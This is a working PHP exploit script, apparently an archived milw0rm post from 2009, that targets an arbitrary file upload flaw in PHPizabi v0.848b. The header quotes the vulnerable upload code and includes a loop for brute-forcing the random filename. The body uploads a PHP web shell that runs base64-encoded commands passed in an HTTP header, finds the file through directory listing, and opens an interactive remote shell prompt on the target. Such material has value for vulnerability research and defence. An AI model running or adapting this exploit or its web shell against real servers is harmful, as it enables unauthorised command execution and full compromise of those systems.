<?php

/*
	---------------------------------------------------------------
	PHPizabi v0.848b C1 HFP1-3 Remote Arbitrary File Upload Exploit
	---------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.phpizabi.net/

	This PoC was written for educational purpose. Use it at your own risk.
	Author will be not responsible for any damage.

	[-] vulnerable code in /modules/interact/file.php

	29.		if (isset($_POST["Submit"])) {
	30.		
	31.			if (is_uploaded_file($_FILES["file"]["tmp_name"])) {
	32.				$filename = strtolower(rand(1,999)."_".basename($_FILES["file"]["name"]));
	33.				move_uploaded_file($_FILES["file"]["tmp_name"], "system/cache/temp/{$filename}");
	34.					
	35.				$ext = strtolower(substr(basename($_FILES["file"]["name"]), strlen(basename($_FILES["file"]["name"]))-3));
	36.				if (in_array($ext, explode(",", $CONF["ATTACHMENT_ALLOWED_EXTENTIONS"]))) {
	37.					
	38.					//
	39.					//	If the user is online, we will send the page
	40.					//	to the lane system
	41.					//
	42.					if (_fnc("user", $_GET["id"], "last_load") > date("U")-300) {
	43.		
	44.						_fnc("laneMakeToken", "file", $_GET["id"], array(
	45.							"{user.username}" => me("username"),
	46.							"{file}" => "system/cache/temp/".$filename,
	47.						));
	48.					}

	PHPizabi is prone to a vulnerability that lets remote attackers to upload and execute arbitrary script code.
	The uploaded file is saved into "/system/cache/temp/" directory and the filename has the form xxx_filename.ext,
	where xxx is a random number between 1 and 999. If directory listing isn't denied the attacker does not need to
	know the actual filename (this poc works only in this case), otherwise there are various ways to retrieve the
	filename, e.g. with this script:

	$chunk = range(1, 999);
	shuffle($chunk);

	$packet  = "GET {$path}system/cache/temp/%d_filename.ext HTTP/1.0\r\n";
	$packet .= "Host: {$host}\r\n";
	$packet .= "Connection: close\r\n\r\n";

	foreach($chunk as $val)
		if (!preg_match("/404 Not Found/i", http_send($host, sprintf($packet, $val)))) break;
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
	if (($s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) == false)
	  die("\nsocket_create(): " . socket_strerror($s) . "\n");

	if (socket_connect($s, $host, 80) == false)
	  die("\nsocket_connect(): " . socket_strerror(socket_last_error()) . "\n");

	socket_write($s, $packet, strlen($packet));
	while ($m = socket_read($s, 2048)) $response .= $m;

	socket_close($s);
	return $response;
}

function upload()
{
	global $host, $path;

	$payload  = "--o0oOo0o\r\n";
	$payload .= "Content-Disposition: form-data; name=\"Submit\"\r\n\r\n\"Send\"\r\n";
	$payload .= "--o0oOo0o\r\n";
	$payload .= "Content-Disposition: form-data; name=\"file\"; filename=\"poc.php\"\r\n\r\n";
	$payload .= "<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))} ?>\r\n";
	$payload .= "--o0oOo0o--\r\n";
	
	$packet  = "POST {$path}?L=interact.file&id=0 HTTP/1.0\r\n";
	$packet .= "Host: {$host}\r\n";
	$packet .= "Content-Length: ".strlen($payload)."\r\n";
	$packet .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";
	$packet .= "Connection: close\r\n\r\n";
	$packet .= $payload;

	http_send($host, $packet);

	$packet  = "GET {$path}system/cache/temp/ HTTP/1.0\r\n";
	$packet .= "Host: {$host}\r\n";
	$packet .= "Connection: close\r\n\r\n";

	if (preg_match("/[0-9]*_poc.php/", http_send($host, $packet), $match))
		return $match[0];
	
	die("\n[-] Directory listing denied\n");
}

print "\n+-------------------------------------------------------------------------+";
print "\n| PHPizabi v0.848b C1 HFP1-3 Remote Arbitrary File Upload Exploit by EgiX |";
print "\n+-------------------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage......: php $argv[0] host path\n";
	print "\nExample....: php $argv[0] localhost /";
	print "\nExample....: php $argv[0] localhost /phpizabi/\n\n";
	die();
}

$host = $argv[1];
$path = $argv[2];

$r_path = upload();

$packet  = "GET {$path}system/cache/temp/{$r_path} HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Connection: close\r\n\r\n";

while(1)
{
	print "\nPHPizabi-shell# ";
	if (($cmd = trim(fgets(STDIN))) == "exit") break;

	$response = http_send($host, sprintf($packet, base64_encode($cmd)));
	preg_match("/_code_/", $response) ? print array_pop(explode("_code_", $response)) : die("\n[-] Exploit failed\n");
}

?>

# milw0rm.com [2009-03-25]